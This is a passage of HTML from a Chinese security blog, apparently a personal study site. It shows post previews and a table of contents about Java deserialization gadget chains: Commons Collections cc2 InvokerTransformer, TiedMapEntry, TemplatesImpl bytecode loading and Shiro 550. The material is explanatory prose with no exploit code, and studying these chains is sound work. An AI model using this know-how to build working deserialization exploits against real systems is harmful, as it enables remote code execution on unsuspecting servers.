先对参数key进行判断，如果是null就返回0，有值就调用hashCode方法，先对参数key进行分析，这里key为一个随意的对象，根据链中可以看出传入的key是一个TiedMapEntry对象，追踪TieMapEn...</div></div></div></a><a class="pagination-related" href="/2025/12/28/cc2%E9%93%BE%E7%9A%84InvokerTransformer%E9%93%BE/" title="cc2链的InvokerTransformer链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">cc2链的InvokerTransformer链</div></div><div class="info-2"><div class="info-item-1">一：ChainedTransformer–InvokerTransformer利用链分析一：入口处PriorityQueue类该类实现了序列化接口，满足利用条件，重写了readObject方法，是反序列化链的入口处，传入了一个ObjectinputStream类的实例化s，后续再方法中利用对象输入流的实例s进行了多次调用，s是序列化后的字节数据，先执行默认反序列化逻辑，恢复s的非transient 成员变量，比如size，s.readInt读取反序列化后的int类型数据，后续初始化一个队列，大小就是前面读取序列化字节流恢复的size，然后循环对s进行反序列化读取字节流，回复对象，因为PriorityQueue的底层是数组，序列化时需要逐次写入流，反序列化读取时也需要逐次读取流进行恢复，并且依次填入队列中  s.readObject的作用：在利用ObjectOutputStream.writeObject()进行序列化时，会将int类型的属性转换为字节流，ObjectnputStream.readInt()的作用是反序列化时的将字节流还原成int类型的值，并且赋值给成员 假设一个类...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">inyyy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/inyyy/inyyy.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1%E9%93%BE-TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">第二条链-TemplatesImpl字节码链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#javassist"><span class="toc-number">1.0.1.</span> <span class="toc-text">javassist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader%E4%B8%AD%E7%9A%84defineClass%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.2.</span> <span class="toc-text">ClassLoader中的defineClass方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">java字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">类加载机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Classloader"><span class="toc-number">1.2.1.</span> <span class="toc-text">Classloader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader"><span class="toc-number">1.2.2.</span> <span class="toc-text">URLClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#translet%E7%B1%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">translet类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E7%B1%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text">TemplatesImpl类</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="shiro550反序列化">shiro550反序列化</a><time datetime="2026-01-08T11:19:03.000Z" title="发表于 2026-01-08 19:19:03">2026-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/30/cc6-HashMap%E9%93%BE/" title="cc6-HashMap链">cc6-HashMap链</a><time datetime="2025-12-30T10:59:19.000Z" title="发表于 2025-12-30 18:59:19">2025-12-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/" title="cc4的TemplatesImpl字节码链">cc4的TemplatesImpl字节码链</a><time datetime="2025-12-28T09:49:01.000Z" title="发表于 2025-12-28 17:49:01">2025-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/28/cc2%E9%93%BE%E7%9A%84InvokerTransformer%E9%93%BE/" title="cc2链的InvokerTransformer链">cc2链的InvokerTransformer链</a><time datetime="2025-12-28T09:46:23.000Z" title="发表于 2025-12-28 17:46:23">2025-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%8B%B3%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="记一次组合拳高危漏洞挖掘">记一次组合拳高危漏洞挖掘</a><time datetime="2025-12-11T13:38:12.000Z" title="发表于 2025-12-11 21:38:12">2025-12-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By inyyy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>